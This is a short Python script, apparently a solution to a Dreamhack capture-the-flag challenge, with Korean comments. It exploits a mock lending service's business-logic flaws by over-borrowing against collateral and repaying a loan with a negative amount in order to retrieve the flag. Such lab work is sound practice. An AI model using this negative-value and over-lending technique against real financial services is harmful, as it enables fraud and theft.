import requests

port = 13256
url_index = f"http://host3.dreamhack.games:{port}/"
url_DHH_lend = url_index + "santa/lend"
url_change = url_index + "santa/change"
url_collateral = url_index + "dream/collateral"
url_DHD_lend = url_index + "dream/lend"
url_flag = url_index + "santa/flag"

s = requests.Session()

# 로그인
param = {
  "name" : "hello"
}
r = s.post(url_index, data = param)

# 1000DHH 대출
param = {
  "value" : 1000
}
r = s.post(url_DHH_lend, data = param)

# 1000DHH 모두 1000DHC로 돌림
param = {
  "from" : 0,
  "to" : 1,
  "value" : 1000
}
r = s.post(url_change, data = param)

# 1000DHC 모두 담보로 돌림
param = {
  "value" : 1000
}
r = s.post(url_collateral, data = param)

# 500DHD씩 4번 총 2000DHD 대출
param = {
  "value" : 500
}
for i in range(4) :
  r = s.post(url_DHD_lend, data = param)

# 2000DHD 모두 2000DHH로 돌림
param = {
  "from" : 2,
  "to" : 0,
  "value" : 2000
}
r = s.post(url_change, data = param)

# 1000DHH 갚기
param = {
  "value" : -1000
}
r = s.post(url_DHH_lend, data = param)

# flag 가져오기
r = s.get(url_flag)
print(r.text)